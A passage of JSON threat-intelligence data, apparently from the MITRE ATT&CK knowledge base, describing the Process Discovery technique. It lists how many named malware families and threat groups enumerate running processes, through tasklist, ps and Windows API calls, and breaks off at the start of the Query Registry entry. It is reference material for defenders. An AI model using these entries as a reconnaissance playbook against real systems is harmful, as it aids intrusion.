"ROADTools can enumerate Azure AD groups."}]}]}, {"name": "Process Discovery", "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.", "detailed_description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.", "id": "T1057", "examples": [{"id": "S0065", "name": "4H RAT", "description": "4H RAT has the capability to obtain a listing of running processes (including loaded modules)."}, {"id": "S0045", "name": "ADVSTORESHELL", "description": "ADVSTORESHELL can list running processes."}, {"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla can list the current running processes on the system."}, {"id": "S1129", "name": "Akira", "description": "Akira verifies the deletion of volume shadow copies by checking for the existence of the process ID related to the process created to delete these items."}, {"id": "G0138", "name": "Andariel", "description": "Andariel has used tasklist to enumerate processes and find a specific string."}, {"id": "S1133", "name": "Apostle", "description": "Apostle retrieves a list of all running processes on a victim host, and stops all services containing the string \"sql,\" likely to propagate ransomware activity to database files."}, {"id": "S0622", "name": "AppleSeed", "description": "AppleSeed can enumerate the current process on a compromised host."}, {"id": "G0006", "name": "APT1", "description": "APT1 gathered a list of running processes on the system using tasklist /v."}, {"id": "G0007", "name": "APT28", "description": "An APT28 loader Trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions."}, {"id": "G0022", "name": "APT3", "description": "APT3 has a tool that can list out currently running processes."}, {"id": "G0067", "name": "APT37", "description": "APT37's Freenki malware lists running processes using the Microsoft Windows API."}, {"id": "G0082", "name": "APT38", "description": "APT38 leveraged Sysmon to understand the processes, services in the organization."}, {"id": "G1023", "name": "APT5", "description": "APT5 has used Windows-based utilities to carry out tasks including tasklist.exe. "}, {"id": "S0456", "name": "Aria-body", "description": "Aria-body has the ability to enumerate loaded modules for a process.."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth searches for different processes on the system."}, {"id": "S1087", "name": "AsyncRAT", "description": "AsyncRAT can examine running processes to determine if a debugger is present."}, {"id": "S0640", "name": "Avaddon", "description": "Avaddon has collected information about running processes."}, {"id": "S0473", "name": "Avenger", "description": "Avenger has the ability to use Tasklist to identify running processes."}, {"id": "S1053", "name": "AvosLocker", "description": "AvosLocker has discovered system processes by calling RmGetList."}, {"id": "S0344", "name": "Azorult", "description": "Azorult can collect a list of running processes by calling CreateToolhelp32Snapshot."}, {"id": "S0638", "name": "Babuk", "description": "Babuk has the ability to check running processes on a targeted system."}, {"id": "S0414", "name": "BabyShark", "description": "BabyShark has executed the tasklist command."}, {"id": "S0093", "name": "Backdoor.Oldrea", "description": "Backdoor.Oldrea collects information about running processes."}, {"id": "S0031", "name": "BACKSPACE", "description": "BACKSPACE may collect information about running processes."}, {"id": "S0606", "name": "Bad Rabbit", "description": "Bad Rabbit can enumerate all running processes to compare hashes."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can retrieve a list of running processes from a compromised machine."}, {"id": "S0239", "name": "Bankshot", "description": "Bankshot identifies processes and collects the process ids."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can identity the current process on a compromised host."}, {"id": "S0127", "name": "BBSRAT", "description": "BBSRAT can list running processes."}, {"id": "S0017", "name": "BISCUIT", "description": "BISCUIT has a command to enumerate running processes and identify their owners."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal can obtain a list of running processes on the victim\u2019s machine."}, {"id": "S0069", "name": "BLACKCOFFEE", "description": "BLACKCOFFEE has the capability to discover processes."}, {"id": "S0089", "name": "BlackEnergy", "description": "BlackEnergy has gathered a process list by using Tasklist.exe."}, {"id": "S0657", "name": "BLUELIGHT", "description": "BLUELIGHT can collect process filenames and SID authority level."}, {"id": "S0486", "name": "Bonadan", "description": "Bonadan can use the ps command to discover other cryptocurrency miners active on the system."}, {"id": "S0252", "name": "Brave Prince", "description": "Brave Prince lists the running processes."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 can enumerate all processes and locate specific process IDs (PIDs)."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can identify processes associated with analytical tools."}, {"id": "S0482", "name": "Bundlore", "description": "Bundlore has used the ps command to list processes."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors used the tasklist /s command as well as taskmanager to obtain a list of running processes."}, {"id": "S0693", "name": "CaddyWiper", "description": "CaddyWiper can obtain a list of current processes."}, {"id": "S0351", "name": "Cannon", "description": "Cannon can obtain a list of processes running on the system."}, {"id": "S0030", "name": "Carbanak", "description": "Carbanak lists running processes."}, {"id": "S0484", "name": "Carberp", "description": "Carberp has collected a list of running processes."}, {"id": "S0335", "name": "Carbon", "description": "Carbon can list the processes on the victim\u2019s machine."}, {"id": "S0348", "name": "Cardinal RAT", "description": "Cardinal RAT contains watchdog functionality that ensures its process is always running, else spawns a new instance."}, {"id": "S0572", "name": "Caterpillar WebShell", "description": "Caterpillar WebShell can gather a list of processes running on the machine."}, {"id": "S0674", "name": "CharmPower", "description": "CharmPower has the ability to list running processes through the use of tasklist."}, {"id": "S0144", "name": "ChChes", "description": "ChChes collects its process identifier (PID) on the victim."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used tasklist to enumerate processes."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP can check if a process name contains \"creensaver.\""}, {"id": "S0660", "name": "Clambling", "description": "Clambling can enumerate processes on a targeted system."}, {"id": "S0611", "name": "Clop", "description": "Clop can enumerate all processes on the victim's machine."}, {"id": "S1105", "name": "COATHANGER", "description": "COATHANGER will query running process information to determine subsequent program execution flow."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike's Beacon payload can collect information on process details."}, {"id": "S0244", "name": "Comnie", "description": "Comnie uses the tasklist to view running processes on the victim\u2019s machine."}, {"id": "S0575", "name": "Conti", "description": "Conti can enumerate through all open processes to search for any that have the string \"sql\" in their process name."}, {"id": "S0115", "name": "Crimson", "description": "Crimson contains a command to list processes."}, {"id": "S0625", "name": "Cuba", "description": "Cuba can enumerate processes running on a victim's machine."}, {"id": "S1153", "name": "Cuckoo Stealer", "description": "Cuckoo Stealer can use ps aux to enumerate running processes."}, {"id": "S0687", "name": "Cyclops Blink", "description": "Cyclops Blink can enumerate the process it is currently running under."}, {"id": "S0497", "name": "Dacls", "description": "Dacls can collect data on running and parent processes."}, {"id": "S0334", "name": "DarkComet", "description": "DarkComet can list active processes running on the victim\u2019s machine."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate performs various checks for running processes, including security software by looking for hard-coded process name values."}, {"id": "G0012", "name": "Darkhotel", "description": "Darkhotel malware can collect a list of running processes on a system."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla can enumerate a list of running processes on a compromised system."}, {"id": "G0009", "name": "Deep Panda", "description": "Deep Panda uses the Microsoft Tasklist utility to list processes running on systems."}, {"id": "S0021", "name": "Derusbi", "description": "Derusbi collects current and parent process IDs."}, {"id": "S0659", "name": "Diavol", "description": "Diavol has used CreateToolhelp32Snapshot, Process32First, and Process32Next API calls to enumerate the running processes in the system."}, {"id": "S0600", "name": "Doki", "description": "Doki has searched for the current process\u2019s PID."}, {"id": "S0695", "name": "Donut", "description": "Donut includes subprojects that enumerate and identify information about Process Injection candidates."}, {"id": "S0472", "name": "down_new", "description": "down_new has the ability to list running processes on a compromised host."}, {"id": "S0694", "name": "DRATzarus", "description": "DRATzarus can enumerate and examine running processes to determine if a debugger is present."}, {"id": "S0567", "name": "Dtrack", "description": "Dtrack\u2019s dropper can list all running processes."}, {"id": "S0038", "name": "Duqu", "description": "The discovery modules used with Duqu can collect information on process details."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP can enumerate running processes."}, {"id": "S0062", "name": "DustySky", "description": "DustySky collects information about running processes from victims."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has used Tasklist to obtain information from a compromised host."}, {"id": "S0605", "name": "EKANS", "description": "EKANS looks for processes from a hard-coded list."}, {"id": "S0081", "name": "Elise", "description": "Elise enumerates processes via the tasklist command."}, {"id": "S0064", "name": "ELMER", "description": "ELMER is capable of performing process listings."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has been observed enumerating local processes."}, {"id": "S0363", "name": "Empire", "description": "Empire can find information about processes running on local and remote systems."}, {"id": "S0091", "name": "Epic", "description": "Epic uses the tasklist /v command to obtain a list of processes."}, {"id": "S0396", "name": "EvilBunny", "description": "EvilBunny has used EnumProcesses() to identify how many process are running in the environment."}, {"id": "S0512", "name": "FatDuke", "description": "FatDuke can list running processes on the localhost."}, {"id": "S0267", "name": "FELIXROOT", "description": "FELIXROOT collects a list of running processes."}, {"id": "S0355", "name": "Final1stspy", "description": "Final1stspy obtains a list of running processes."}, {"id": "S0182", "name": "FinFisher", "description": "FinFisher checks its parent process for indications that it is running in a sandbox setup."}, {"id": "S0696", "name": "Flagpro", "description": "Flagpro has been used to run the tasklist command on a compromised system."}, {"id": "S0661", "name": "FoggyWeb", "description": "FoggyWeb's loader can enumerate all Common Language Runtimes (CLRs) and running Application Domains in the compromised AD FS server's Microsoft.IdentityServer.ServiceHost.exe process."}, {"id": "S0503", "name": "FrameworkPOS", "description": "FrameworkPOS can enumerate and exclude selected processes on a compromised host to speed execution of memory scraping."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors used Empire to obtain a list of all running processes."}, {"id": "S0277", "name": "FruitFly", "description": "FruitFly has the ability to list processes on the system."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream has the ability to discover processes, including Bka.exe and BkavUtil.exe."}, {"id": "C0007", "name": "FunnyDream", "description": "During FunnyDream, the threat actors used Tasklist on targeted systems."}, {"id": "S0410", "name": "Fysbis", "description": "Fysbis can collect information about running processes."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has used tools to enumerate processes on target hosts including Process Explorer."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can enumerate running processes."}, {"id": "S0049", "name": "GeminiDuke", "description": "GeminiDuke collects information on running processes and environment variables from the victim."}, {"id": "S0460", "name": "Get2", "description": "Get2 has the ability to identify running processes on an infected host."}, {"id": "S0032", "name": "gh0st RAT", "description": "gh0st RAT has the capability to list processes."}, {"id": "S0249", "name": "Gold Dragon", "description": "Gold Dragon checks the running processes on the victim\u2019s machine."}, {"id": "S0477", "name": "Goopy", "description": "Goopy has checked for the Google Updater process to ensure Goopy was loaded properly."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can identify installed security tools based on process names."}, {"id": "S0237", "name": "GravityRAT", "description": "GravityRAT lists the running processes on the system."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has used tasklist to enumerate processes."}, {"id": "S0151", "name": "HALFBAKED", "description": "HALFBAKED can obtain information about running processes on the victim."}, {"id": "S0617", "name": "HELLOKITTY", "description": "HELLOKITTY can search for specific processes to terminate."}, {"id": "S0170", "name": "Helminth", "description": "Helminth has used Tasklist to get information on processes."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has enumerated processes on targeted systems."}, {"id": "S1027", "name": "Heyoka Backdoor", "description": "Heyoka Backdoor can gather process information."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa\u2019s shellcode attempted to find the process ID of the current process."}, {"id": "S0431", "name": "HotCroissant", "description": "HotCroissant has the ability to list running processes on the infected host."}, {"id": "S0203", "name": "Hydraq", "description": "Hydraq creates a backdoor through which remote attackers can monitor processes."}, {"id": "S0278", "name": "iKitten", "description": "iKitten lists the current processes running."}, {"id": "S0434", "name": "Imminent Monitor", "description": "Imminent Monitor has a \"Process Watcher\" feature to monitor processes in case the client ever crashes or gets closed."}, {"id": "S1139", "name": "INC Ransomware", "description": "INC Ransomware can use the Microsoft Win32 Restart Manager to kill processes with a specific handle or that are accessing resources it wants to encrypt."}, {"id": "G0100", "name": "Inception", "description": "Inception has used a reconnaissance module to identify active processes and other associated loaded modules."}, {"id": "S1072", "name": "Industroyer2", "description": "Industroyer2 has the ability to cyclically enumerate running processes such as PServiceControl.exe, PService_PDD.exe, and other targets supplied through a hardcoded configuration."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can obtain a list of running processes."}, {"id": "S1132", "name": "IPsec Helper", "description": "IPsec Helper can identify the process it is currently running under and its number, and pass this back to a command and control node."}, {"id": "S0581", "name": "IronNetInjector", "description": "IronNetInjector can identify processes via C# methods such as GetProcessesByName and running Tasklist with the Python os.popen function."}, {"id": "S0015", "name": "Ixeshe", "description": "Ixeshe can list running processes."}, {"id": "S0528", "name": "Javali", "description": "Javali can monitor processes for open browsers and custom banking applications."}, {"id": "S0044", "name": "JHUHUGIT", "description": "JHUHUGIT obtains a list of running processes on the victim."}, {"id": "S0201", "name": "JPIN", "description": "JPIN can list running processes."}, {"id": "S0283", "name": "jRAT", "description": "jRAT can query and kill system processes."}, {"id": "S0088", "name": "Kasidet", "description": "Kasidet has the ability to search for a given process name in processes currently running in the system."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar obtains a list of running processes through WMI querying and the ps command."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang performs process discovery using tasklist commands."}, {"id": "S0271", "name": "KEYMARBLE", "description": "KEYMARBLE can obtain a list of running processes on the system."}, {"id": "S0607", "name": "KillDisk", "description": "KillDisk has called GetCurrentProcess."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky can gather a list of all processes running on a victim's machine."}, {"id": "S0599", "name": "Kinsing", "description": "Kinsing has used ps to list processes."}, {"id": "S0162", "name": "Komplex", "description": "The OsInfo function in Komplex collects a running process list."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has used the command cmd /c tasklist to get a snapshot of the current processes on the target machine."}, {"id": "S1075", "name": "KOPILUWAK", "description": "KOPILUWAK can enumerate current running processes on the targeted machine."}, {"id": "C0035", "name": "KV Botnet Activity", "description": "Scripts associated with KV Botnet Activity initial deployment can identify processes related to security tools and other botnet families for follow-on disabling during installation."}, {"id": "S0236", "name": "Kwampirs", "description": "Kwampirs collects a list of running services with the command tasklist /v."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus can enumerate running processes including process grandchildren on targeted hosts."}, {"id": "G0032", "name": "Lazarus Group", "description": "Several Lazarus Group malware families gather a list of running processes on a victim system and send it to their C2 server. A Destover-like variant used by Lazarus Group also gathers process times."}, {"id": "S0211", "name": "Linfo", "description": "Linfo creates a backdoor through which remote attackers can retrieve a list of running processes."}, {"id": "S0681", "name": "Lizar", "description": "Lizar has a plugin designed to obtain a list of processes."}, {"id": "S0582", "name": "LookBack", "description": "LookBack can list running processes."}, {"id": "S0451", "name": "LoudMiner", "description": "LoudMiner used the ps command to monitor the running processes on the system."}, {"id": "S0532", "name": "Lucifer", "description": "Lucifer can identify the process that owns remote connections."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb has used shell commands to list running processes."}, {"id": "S0409", "name": "Machete", "description": "Machete has a component to check for running processes to look for web browsers."}, {"id": "S1016", "name": "MacMa", "description": "MacMa can enumerate running processes."}, {"id": "S1048", "name": "macOS.OSAMiner", "description": "macOS.OSAMiner has used ps ax | grep <name> | grep -v grep | ... and ps ax | grep -E... to conduct process discovery."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can enumerate running processes on a machine."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound malware can list running processes."}, {"id": "S0652", "name": "MarkiRAT", "description": "MarkiRAT can search for different processes on a system."}, {"id": "S0449", "name": "Maze", "description": "Maze has gathered all of the running system processes."}, {"id": "S1059", "name": "metaMain", "description": "metaMain can enumerate the processes that run on the platform."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has performed process name checks and has monitored applications."}, {"id": "S0688", "name": "Meteor", "description": "Meteor can check if a specific process is running, such as Kaspersky's avp.exe."}, {"id": "S1146", "name": "MgBot", "description": "MgBot includes a module for establishing a process watchdog for itself, identifying if the MgBot process is still running."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu can enumerate the running processes on a compromised host."}, {"id": "S0079", "name": "MobileOrder", "description": "MobileOrder has a command to upload information about all running processes to its C2 server."}, {"id": "G0021", "name": "Molerats", "description": "Molerats actors obtained a list of active processes on the victim and sent them to C2 servers."}, {"id": "S0149", "name": "MoonWind", "description": "MoonWind has a command to return a list of running processes."}, {"id": "S0256", "name": "Mosquito", "description": "Mosquito runs tasklist to obtain running processes."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used malware to obtain a list of running processes on the system."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has used tasklist /v to determine active process information."}, {"id": "S0247", "name": "NavRAT", "description": "NavRAT uses tasklist /v to check running processes."}, {"id": "S0630", "name": "Nebulae", "description": "Nebulae can enumerate processes on a target system."}, {"id": "S0034", "name": "NETEAGLE", "description": "NETEAGLE can send process listings over the C2 channel."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can discover processes on compromised hosts."}, {"id": "S1090", "name": "NightClub", "description": "NightClub has the ability to use GetWindowThreadProcessId to identify the process behind a specified window."}, {"id": "S1147", "name": "Nightdoor", "description": "Nightdoor can collect information on installed applications via Windows registry keys, as well as collecting information on running processes."}, {"id": "S1100", "name": "Ninja", "description": "Ninja can enumerate processes on a targeted host."}, {"id": "S0385", "name": "njRAT", "description": "njRAT can search a list of running processes for Tr.exe."}, {"id": "S1107", "name": "NKAbuse", "description": "NKAbuse will check victim systems to ensure only one copy of the malware is running."}, {"id": "S0644", "name": "ObliqueRAT", "description": "ObliqueRAT can check for blocklisted process names on a compromised host."}, {"id": "S0346", "name": "OceanSalt", "description": "OceanSalt can collect the name and ID for every process running on the system."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has run tasklist on a victim's machine."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors used the tasklist command as part of their advanced reconnaissance."}, {"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, the threat actors obtained a list of running processes on a victim machine using cmd /c tasklist > %temp%\\temp.ini."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, the threat actors used tasklist to collect a list of running processes on an infected system."}, {"id": "S0229", "name": "Orz", "description": "Orz can gather a process list from the victim."}, {"id": "S1017", "name": "OutSteel", "description": "OutSteel can identify running processes on a compromised host."}, {"id": "S0626", "name": "P8RAT", "description": "P8RAT can check for specific processes associated with virtual environments."}, {"id": "S0664", "name": "Pandora", "description": "Pandora can monitor processes on a compromised host."}, {"id": "S0208", "name": "Pasam", "description": "Pasam creates a backdoor through which remote attackers can retrieve lists of running processes."}, {"id": "S1050", "name": "PcShare", "description": "PcShare can obtain a list of running processes on a compromised host."}, {"id": "S0517", "name": "Pillowmint", "description": "Pillowmint can iterate through running processes every six seconds collecting a list of processes to capture from later."}, {"id": "S0501", "name": "PipeMon", "description": "PipeMon can iterate over the running processes to find a suitable injection target."}, {"id": "S0254", "name": "PLAINTEE", "description": "PLAINTEE performs the tasklist command to list running processes."}, {"id": "G1040", "name": "Play", "description": "Play has used the information stealer Grixba to check for a list of security processes."}, {"id": "S0435", "name": "PLEAD", "description": "PLEAD has the ability to list processes on the compromised host."}, {"id": "S0013", "name": "PlugX", "description": "PlugX has a module to list the processes running on a machine."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT has the ability to list all running processes."}, {"id": "S0216", "name": "POORAIM", "description": "POORAIM can enumerate processes."}, {"id": "G0033", "name": "Poseidon Group", "description": "After compromising a victim, Poseidon Group lists all running processes."}, {"id": "S0139", "name": "PowerDuke", "description": "PowerDuke has a command to list the victim's processes."}, {"id": "S0441", "name": "PowerShower", "description": "PowerShower has the ability to deploy a reconnaissance module to retrieve a list of the active processes."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit's Get-ProcessTokenPrivilege Privesc-PowerUp module can enumerate privileges for a given process."}, {"id": "S0393", "name": "PowerStallion", "description": "PowerStallion has been used to monitor process lists."}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS has used get_tasklist to discover processes on the compromised host."}, {"id": "S0184", "name": "POWRUNER", "description": "POWRUNER may collect process information by running tasklist on a victim."}, {"id": "S0238", "name": "Proxysvc", "description": "Proxysvc lists processes running on the system."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can list the running processes and get the process ID and parent process\u2019s ID."}, {"id": "S0650", "name": "QakBot", "description": "QakBot has the ability to check running processes."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay can enumerate processes on a target system."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can gather a list of running processes by using Tasklist."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin can identify processes running on the victim machine, such as security software, during execution."}, {"id": "S0241", "name": "RATANKBA", "description": "RATANKBA lists the system\u2019s processes."}, {"id": "S0662", "name": "RCSession", "description": "RCSession can identify processes based on PID."}, {"id": "S0125", "name": "Remsec", "description": "Remsec can obtain a process list from the victim."}, {"id": "S0448", "name": "Rising Sun", "description": "Rising Sun can enumerate all running processes and process information on an infected machine."}, {"id": "G0106", "name": "Rocke", "description": "Rocke can detect a running process's PID on the infected machine."}, {"id": "S0270", "name": "RogueRobin", "description": "RogueRobin checks the running processes for evidence it may be running in a sandbox environment. It specifically enumerates processes for Wireshark and Sysinternals."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT can list the current running processes on the system."}, {"id": "S1078", "name": "RotaJakiro", "description": "RotaJakiro can monitor the /proc/[PID] directory of known RotaJakiro processes as a part of its persistence when executing with non-root permissions. If the process is found dead, it resurrects the process. RotaJakiro processes can be matched to an associated Advisory Lock, in the /proc/locks folder, to ensure it doesn't spawn more than one process."}, {"id": "S1073", "name": "Royal", "description": "Royal can use GetCurrentProcess to enumerate processes."}, {"id": "S0148", "name": "RTM", "description": "RTM can obtain information about process integrity levels."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk has called CreateToolhelp32Snapshot to enumerate all running processes."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has enumerated running processes on a compromised host to determine if it is running under the process name dfrgui.exe."}, {"id": "S1085", "name": "Sardonic", "description": "Sardonic has the ability to execute the tasklist command."}, {"id": "S0461", "name": "SDBbot", "description": "SDBbot can enumerate a list of running processes on a compromised machine."}, {"id": "S0345", "name": "Seasalt", "description": "Seasalt has a command to perform a process listing."}, {"id": "S0596", "name": "ShadowPad", "description": "ShadowPad has collected the PID of a malicious process."}, {"id": "S0445", "name": "ShimRatReporter", "description": "ShimRatReporter listed all running processes on the machine."}, {"id": "S0063", "name": "SHOTPUT", "description": "SHOTPUT has a command to obtain a process listing."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has used tools to identify running processes on the victim's machine."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can enumerate processes, including properties to determine if they have the Common Language Runtime (CLR) loaded."}, {"id": "S0468", "name": "Skidmap", "description": "Skidmap has monitored critical processes to ensure resiliency."}, {"id": "S0533", "name": "SLOTHFULMEDIA", "description": "SLOTHFULMEDIA has enumerated processes by ID, name, or privileges."}, {"id": "S1124", "name": "SocGholish", "description": "SocGholish can list processes on targeted hosts."}, {"id": "S0273", "name": "Socksbot", "description": "Socksbot can list all running processes."}, {"id": "S0627", "name": "SodaMaster", "description": "SodaMaster can search a list of running processes."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used multiple command-line utilities to enumerate running processes."}, {"id": "S0615", "name": "SombRAT", "description": "SombRAT can use the getprocesslist command to enumerate processes on a compromised host."}, {"id": "S0516", "name": "SoreFang", "description": "SoreFang can enumerate processes on a victim machine through use of Tasklist."}, {"id": "G0038", "name": "Stealth Falcon", "description": "Stealth Falcon malware gathers a list of running processes."}, {"id": "S0142", "name": "StreamEx", "description": "StreamEx has the ability to enumerate processes."}, {"id": "S0491", "name": "StrongPity", "description": "StrongPity can determine if a user is logged in by checking to see if explorer.exe is running."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST collected a list of process names that were hashed using a FNV-1a + XOR algorithm to check against similarly-hashed hardcoded blocklists."}, {"id": "S0562", "name": "SUNSPOT", "description": "SUNSPOT monitored running processes for instances of MsBuild.exe by hashing the name of each running process and comparing it to the corresponding value 0x53D525. It also extracted command-line arguments and individual arguments from the running MsBuild.exe process to identify the directory path of the Orion software Visual Studio solution."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady can collect a list of running processes from an infected host."}, {"id": "S0018", "name": "Sykipot", "description": "Sykipot may gather a list of running processes by running tasklist /v."}, {"id": "S0242", "name": "SynAck", "description": "SynAck enumerates all running processes."}, {"id": "S0464", "name": "SYSCON", "description": "SYSCON has the ability to use Tasklist to list running processes."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate can collect information about running processes."}, {"id": "S0011", "name": "Taidoor", "description": "Taidoor can use GetCurrentProcessId for process discovery."}, {"id": "S0586", "name": "TAINTEDSCRIBE", "description": "TAINTEDSCRIBE can execute ProcessList for process discovery."}, {"id": "S0467", "name": "TajMahal", "description": "TajMahal has the ability to identify running processes and associated plugins on an infected host."}, {"id": "S0057", "name": "Tasklist", "description": "Tasklist can be used to discover processes running on a system."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has searched for rival malware and removes it if found. TeamTNT has also searched for running processes containing the strings aliyun or liyun to identify machines running Alibaba Cloud Security tools."}, {"id": "S0595", "name": "ThiefQuest", "description": "ThiefQuest obtains a list of running processes using the function kill_unwanted."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat has run cmd /c start /b tasklist to enumerate processes."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot uses module networkDll for process list discovery."}, {"id": "S0094", "name": "Trojan.Karagany", "description": "Trojan.Karagany can use Tasklist to collect a list of running tasks."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper is capable of enumerating the running processes on the system using pslist."}, {"id": "S0436", "name": "TSCookie", "description": "TSCookie has the ability to list processes on the infected host."}, {"id": "G0010", "name": "Turla", "description": "Turla surveys a system upon check-in to discover running processes using the tasklist /v command. Turla RPC backdoors have also enumerated processes associated with specific open ports or named pipes."}, {"id": "S0333", "name": "UBoatRAT", "description": "UBoatRAT can list running processes on the system."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos can use its Process List command to enumerate processes on compromised hosts."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has gathered information about running processes."}, {"id": "S0452", "name": "USBferry", "description": "USBferry can use tasklist to gather information about the process running on the infected system."}, {"id": "S0476", "name": "Valak", "description": "Valak has the ability to enumerate running processes on a compromised host."}, {"id": "S0257", "name": "VERMIN", "description": "VERMIN can get a list of the processes and running tasks on the system."}, {"id": "S0180", "name": "Volgmer", "description": "Volgmer can gather a list of processes."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has enumerated running processes on targeted systems including through the use of Tasklist."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT can obtain a list of processes on a compromised host."}, {"id": "S0579", "name": "Waterbear", "description": "Waterbear can identify the process for a specific security product."}, {"id": "G0112", "name": "Windshift", "description": "Windshift has used malware to enumerate active processes."}, {"id": "S0219", "name": "WINERACK", "description": "WINERACK can enumerate processes."}, {"id": "S0059", "name": "WinMM", "description": "WinMM sets a WH_CBT Windows hook to collect information on process creation."}, {"id": "S0141", "name": "Winnti for Windows", "description": "Winnti for Windows can check if the explorer.exe process is responsible for calling its install function."}, {"id": "G0044", "name": "Winnti Group", "description": "Winnti Group looked for a specific process running on infected servers."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT can call NtQuerySystemProcessInformation with SystemProcessInformation to enumerate all running processes, including associated information such as PID, parent PID, image name, and owner."}, {"id": "S0161", "name": "XAgentOSX", "description": "XAgentOSX contains the getProcessList function to run ps aux to get running processes."}, {"id": "S0248", "name": "yty", "description": "yty gets an output of running processes using the tasklist command."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy uses the tasklist and wmic process get Capture, ExecutablePath commands to gather the processes running on the system."}, {"id": "S0330", "name": "Zeus Panda", "description": "Zeus Panda checks for running processes on the victim\u2019s machine."}, {"id": "S1114", "name": "ZIPLINE", "description": "ZIPLINE can identify running processes and their names."}, {"id": "S0672", "name": "Zox", "description": "Zox has the ability to list processes."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell has a command, ps, to obtain a listing of processes on the system."}, {"id": "S1013", "name": "ZxxZ", "description": "ZxxZ has created a snapshot of running processes using CreateToolhelp32Snapshot."}], "sub_techniques": []}, {"name": "Query Registry", "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.", "detailed_description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.", "id": "T1012", "examples": [{"id": "S0045", "name": "ADVSTORESHELL", "description": "ADVSTORESHELL can enumerate registry 